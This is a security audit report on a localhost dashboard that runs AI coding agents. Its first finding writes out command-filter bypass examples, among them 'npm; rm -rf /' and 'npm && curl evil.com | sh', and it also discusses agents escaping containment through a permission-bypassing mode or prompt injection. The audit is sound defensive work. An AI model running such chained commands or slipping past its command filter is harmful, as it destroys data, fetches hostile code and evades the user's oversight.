# Security Audit Report

**Date**: 2026-04-10
**Scope**: Full codebase review of Claude Agents Dashboard
**Threat model**: Localhost single-user developer tool. The server binds to `127.0.0.1` only, is operated by the local developer, and is not designed for network exposure or multi-user access.

---

## Executive Summary

This audit identified **14 security findings** relevant to a localhost developer tool: 2 High, 5 Medium, and 7 Low/Info. The application's security posture is **reasonable for its intended use case**. The two high-severity findings relate to agent containment — the primary real threat being an AI agent that escapes its intended boundaries and causes unintended changes to the host system.

Traditional web security concerns (authentication, CORS, rate limiting) are largely irrelevant since the server only listens on `127.0.0.1` for a single local user. This audit focuses on the risks that actually matter: **agent containment**, **file system boundary enforcement**, and **defensive coding practices**.

---

## High Severity — Agent Containment

### 1. Command Filter Bypass via Shell Metacharacters

- **Severity**: High
- **File**: `src/agent/command_filter.py`
- **Description**: The command filter extracts the first word via `command.split()[0]` and checks it against allowed prefixes. An agent can bypass this with shell operators:
  - `npm; rm -rf /` (semicolon chaining)
  - `npm && curl evil.com | sh` (AND operator)
  - `npm | exfiltrate` (pipe)
- **Why it matters locally**: This is the primary defense limiting what an agent can do. If the user allows `npm`, they expect only npm commands — not arbitrary shell execution. An agent experiencing hallucinations or prompt injection could exploit this.
- **Recommendation**: Reject commands containing shell operators (`;`, `&&`, `||`, `|`, backticks, `$()`, `>`, `>>`) before checking the prefix. Consider using `shlex.split()` for robust parsing.

### 2. Bash YOLO Mode Has No Guardrails

- **Severity**: High
- **File**: `src/config.py`, `src/services/workflow_service.py`
- **Description**: When `bash_yolo` is enabled, agents run with `permission_mode="bypassPermissions"`, completely disabling the command filter. Agents get unrestricted bash access to the entire host system — they can delete files, install software, modify system configs, or access any file the user can.
- **Why it matters locally**: This is an intentional power-user feature, but a misbehaving agent (prompt injection, hallucination, bad instructions) could cause significant damage to the developer's system. There's no audit trail, no confirmation per command, and no undo.
- **Recommendation**: Add a visible command log in the UI when YOLO mode is active so the user can monitor what's happening. Consider a "YOLO with logging" mode that records all executed commands. A confirmation prompt when first enabling it per session would also help.

---

## Medium Severity — File System Boundaries

### 3. Symlink Following in File Browser

- **Severity**: Medium
- **File**: `src/web/file_routes.py`
- **Description**: The file browser tree scanner follows symlinks (`entry.is_dir(follow_symlinks=True)`) and `validate_file_browser_path()` resolves through symlinks. If the target project contains symlinks pointing outside the project directory (e.g., `ln -s /etc project/link`), those files become browsable.
- **Why it matters locally**: The local user already has access to all their files, so this isn't an escalation. However, it breaks the mental model that the file browser is scoped to the project. It could lead to accidental exposure of sensitive files in the UI.
- **Recommendation**: Skip symlinks during tree scanning: `if entry.is_symlink(): continue`. Or display them with a visual indicator but don't follow them.

### 4. Unvalidated File Paths in Diff Generation

- **Severity**: Medium
- **File**: `src/git/operations.py`
- **Description**: When generating diffs with uncommitted changes, untracked filenames from `git ls-files --others` are used directly to read files:
  ```python
  for f in untracked.split("\n"):
      content = await asyncio.to_thread((worktree_path / f).read_text)
  ```
  No validation that `f` stays within the worktree. Git's output is generally trustworthy, but defense in depth suggests validating anyway.
- **Recommendation**: Apply `validate_file_path()` to each filename before constructing the full path. Verify the resolved path is within the worktree.

### 5. Dynamic SQL Column Names

- **Severity**: Medium (code quality)
- **File**: `src/services/database_service.py`
- **Description**: `update_item()` builds SQL with f-string column names from dict keys:
  ```python
  sets = ", ".join(f"{k} = ?" for k in kwargs)
  ```
  Values are properly parameterized, but column names are not. In practice, all callers pass hardcoded keys from internal code, so this is not exploitable today — but it's a fragile pattern that could become a bug if a future code path passes user-controlled keys.
- **Recommendation**: Add an `ALLOWED_COLUMNS` whitelist and validate keys against it. This is a 5-minute fix that prevents a class of future bugs.

### 6. No CORS Middleware

- **Severity**: Medium
- **File**: `src/web/app.py`
- **Description**: No `CORSMiddleware` is configured. While the server is localhost-only, a malicious website visited in the user's browser could make cross-origin requests to `http://localhost:8000/api/*`. Since there's no authentication, the browser would happily send and receive data. This is a realistic attack vector — a malicious page could start agents, read project files, or modify board state.
- **Why it matters locally**: This is the one "web security" issue that's genuinely relevant to localhost tools. Cross-origin attacks from visited websites are a real threat to local development servers.
- **Recommendation**: Add CORS middleware restricting origins to `localhost`:
  ```python
  app.add_middleware(CORSMiddleware, allow_origins=["http://localhost:8000", "http://127.0.0.1:8000"])
  ```

### 7. Secret File Detection Is Pattern-Based

- **Severity**: Medium
- **File**: `src/web/file_routes.py` (`is_secret_file()`)
- **Description**: The file browser hides files matching known secret patterns (`.env`, `*.key`, `*.pem`, etc.). Files with non-standard names containing secrets (e.g., `credentials.yaml`, `my-tokens.txt`) are not detected and will be visible in the browser — and potentially included in agent context if attached to items.
- **Recommendation**: This is a best-effort feature and the limitation is acceptable. Consider adding a `.browserhidden` config file for project-specific patterns, similar to `.gitignore`.

---

## Low / Informational Findings

### 8. Agent Work Log May Contain Sensitive Data

- **Severity**: Low
- **Files**: `src/services/notification_service.py`
- **Description**: Agent output (command results, file contents, error messages) is logged to the work log without redaction. If an agent reads a `.env` file or a command prints credentials, they appear in the UI and are stored in the SQLite database.
- **Why it's low for localhost**: The local user already has access to these secrets. The concern is that the work log persists them in the database, making them less ephemeral than they would be in a terminal.
- **Recommendation**: Consider adding optional log redaction for common patterns (`sk-...`, `ghp_...`, API key formats) as a nice-to-have.

### 9. Git Output Not Sanitized

- **Severity**: Low
- **File**: `src/git/operations.py`
- **Description**: Git stderr from failed operations may contain ANSI escape codes or control characters, which are passed through to the UI.
- **Mitigating factor**: Jinja2 auto-escapes HTML, and `marked.js` handles the rendering. The risk is cosmetic (garbled output), not exploitable.
- **Recommendation**: Strip ANSI codes from git output for cleaner display.

### 10. Epic Color Input Not Validated

- **Severity**: Low
- **Files**: `src/models.py`, `src/web/routes.py`
- **Description**: `EpicCreate` accepts any `color: str` without validating against the `EPIC_COLORS` whitelist. Since the local user is the only one creating epics, this is not exploitable — just a missing validation.
- **Recommendation**: Add a Pydantic validator against `EPIC_COLORS` for completeness.

### 11. WebSocket X-Forwarded-For Trusted Unconditionally

- **Severity**: Info
- **File**: `src/web/websocket.py`
- **Description**: `_get_client_ip()` trusts the `X-Forwarded-For` header. On localhost without a reverse proxy, this is irrelevant — all connections come from `127.0.0.1`.
- **Recommendation**: No action needed for localhost use. If ever deployed behind a proxy, add trusted proxy validation.

### 12. No Authentication

- **Severity**: Info (for localhost)
- **Files**: `src/web/app.py`, `src/web/routes.py`
- **Description**: No authentication on any endpoint. For a single-user localhost tool, this is the correct design — authentication would add friction with no security benefit since the only user is the local developer.
- **Recommendation**: No action needed. If the application is ever exposed to a network, authentication becomes critical.

### 13. HTTP Only (No TLS)

- **Severity**: Info
- **File**: `src/config.py`
- **Description**: Plain HTTP on localhost. Since traffic never leaves the loopback interface, TLS provides no benefit.
- **Recommendation**: No action needed for localhost.

### 14. Missing Security Response Headers

- **Severity**: Info
- **File**: `src/web/app.py`
- **Description**: No `X-Frame-Options`, `X-Content-Type-Options`, or `Content-Security-Policy` headers. For a localhost tool, the attack surface for clickjacking or MIME sniffing is minimal.
- **Recommendation**: Low priority. Adding `X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY` is trivial and good practice.

---

## Summary Table

| # | Finding | Severity | Primary Risk |
|---|---------|----------|-------------|
| 1 | Command filter bypass via shell operators | **High** | Agent escapes command restrictions |
| 2 | Bash YOLO mode has no guardrails | **High** | Agent runs unrestricted on host |
| 3 | File browser follows symlinks | Medium | Browsing outside project boundary |
| 4 | Unvalidated paths in diff generation | Medium | Reading files outside worktree |
| 5 | Dynamic SQL column names | Medium | Fragile code pattern |
| 6 | No CORS middleware | Medium | Cross-origin attacks from websites |
| 7 | Pattern-based secret detection | Medium | Non-standard secrets visible |
| 8 | Sensitive data in work log | Low | Secrets persisted in database |
| 9 | Unsanitized git output | Low | Garbled display |
| 10 | Epic color not validated | Low | Missing input validation |
| 11 | X-Forwarded-For trusted | Info | N/A for localhost |
| 12 | No authentication | Info | By design for localhost |
| 13 | HTTP only | Info | By design for localhost |
| 14 | Missing security headers | Info | Minimal risk on localhost |

---

## Recommended Actions

### Do Now (high value, low effort)

1. **Fix command filter** (Finding #1): Reject commands containing `;`, `&&`, `||`, `|`, backticks, and `$()`. This is the most impactful security fix — it prevents agents from bypassing command restrictions. ~2 hours.

2. **Add CORS middleware** (Finding #6): A one-liner that prevents cross-origin attacks from malicious websites. ~15 minutes.

3. **Add SQL column whitelist** (Finding #5): Validate kwargs keys in `update_item()` against a set of known columns. Prevents a class of future bugs. ~15 minutes.

### Consider (nice-to-have)

4. **Skip symlinks in file browser** (Finding #3): Small change, tightens the file browser boundary. ~15 minutes.

5. **Validate diff file paths** (Finding #4): Apply `validate_file_path()` to untracked files before reading. ~30 minutes.

6. **Add YOLO mode command logging** (Finding #2): Log all commands executed in YOLO mode to a visible UI panel. Gives the user visibility without removing functionality. ~4 hours.

### Not Needed for Localhost

- Authentication (#12) — correct design for single-user localhost
- TLS (#13) — no network traffic to encrypt
- Rate limiting — no untrusted clients
- Database encryption — OS file permissions are sufficient
- Session ownership — single user

---

## Architecture Strengths

The codebase has several good security practices worth noting:

- **Path traversal protection**: `validate_file_path()` in `operations.py` blocks `..`, absolute paths, null bytes, and control characters. This is well-implemented.
- **Parameterized SQL values**: All user-supplied values in SQL queries use `?` placeholders — no string interpolation of values.
- **Git operation timeouts**: Configurable timeouts prevent hung processes (300s default, 600s for merges).
- **Worktree isolation**: Each agent gets its own git worktree, preventing agents from interfering with each other's work.
- **Secret file hiding**: The file browser proactively hides common secret files (`.env`, keys, certificates).
- **Command access workflow**: The `request_command_access` MCP tool provides a controlled way for agents to ask permission for new commands, with user approval required.
- **Tool filtering**: The `PreToolUse` hook architecture for both command filtering and built-in tool filtering is well-designed and extensible.
